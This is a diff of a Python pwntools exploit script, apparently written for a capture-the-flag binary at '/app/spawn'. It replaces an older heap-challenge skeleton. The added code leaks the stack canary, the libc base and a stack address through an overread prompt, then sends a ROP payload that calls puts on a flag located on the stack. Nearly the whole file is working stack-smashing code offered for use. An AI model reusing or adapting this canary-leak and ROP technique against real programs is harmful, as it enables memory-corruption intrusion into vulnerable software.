@@ -1,5 +1,3 @@
-#!/usr/bin/env python2
-# -*- coding: utf-8 -*
 import re
 import os
 from pwn import *
@@ -23,58 +21,43 @@ def debug(breakpoint=''):
     gdbscript += 'directory %sstdlib/\n' % glibc_dir
     gdbscript += 'directory %slibio/\n' % glibc_dir
     gdbscript += 'directory %self/\n' % glibc_dir
-    gdbscript += 'set follow-fork-mode parent\n'
-    gdbscript += 'set resolve-heap-via-heuristic on\n'
+    gdbscript += 'set follow-fork-mode child\n'
     elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
     gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
     gdb.attach(p, gdbscript)
     time.sleep(1)
 
-elf = ELF("./MercuryBlast")
-libc = ELF("./libc-2.31.so")
-context(arch = elf.arch ,log_level = 'debug', os = 'linux')
 
-def add_record(temp, size, data):
-    sla("Your choice: ", "1")
-    sla("Input Temperature:", str(temp))
-    sla("Input Description Size: ", str(size))
-    sa("Input Description: ", data)
+offset = 74
+elf = ELF("/app/spawn")
+libc = ELF("./libc.so.6")
+context(arch = elf.arch ,log_level = 'debug', os = 'linux',terminal = ['tmux', 'splitw', '-hp','62'])
 
-def print_record():
-    sla("Your choice: ", "2")
-    # sla("Input Index:", str(idx))
+p = process("/app/spawn")
+#debug(0x1213)
+sa("vironment variable:", "a" * 9)
+ru("a" * 9)
+canary = u64(b'\x00' + rc(7))
+log.success(hex(canary))
 
-def delete_record(idx):
-    sla("Your choice: ", "3")
-    sla("Input Index:", str(idx))   
+sa("vironment variable:", "a" * 0x18)
+ru("a" * 0x18)
+libc.address = u64(rc(6) + b'\x00\x00') - 0x280d0
+log.success(hex(libc.address))
 
-def edit_record(idx, temp, size, data):
-    sla("Your choice: ", "4")
-    sla("Input index: ", str(idx))
-    sla("Input Temperature:", str(temp))
-    sla("Input Description Size: ", str(size))
-    sa("Input Description: ", data)
+sa("vironment variable:", "a" * 0x20)
+ru("a" * 0x20)
+stack_leak = u64(rc(6) + b'\x00\x00')
+stack_end = stack_leak - (stack_leak & 0xfff) + 0x2000
+flag_addr = stack_end - offset
+log.success(hex(flag_addr))
 
-def blast(data):
-    sla("Your choice: ", str('\x7f'))
-    se(data)
+rop = ROP(libc)
 
-read_bp = 0x167a
+payload = flat({
+    0x08: canary,
+    0x18: [rop.rdi[0], flag_addr, libc.sym["puts"]]
+})
 
-def exp1():
-    add_record(1, 0x200, b'AAAAAAAA')
-    debug('''
-    b * delete_record
-    b * delete_record+63
-    ''')
-    delete_record(0)
-    p.interactive()
-
-
-def exp2():
-    p.interactive()
-
-    
-p = process("./MercuryBlast")
-exp1()
-# exp2()
+sa("ter feedback for this challenge below", payload)
+p.interactive()
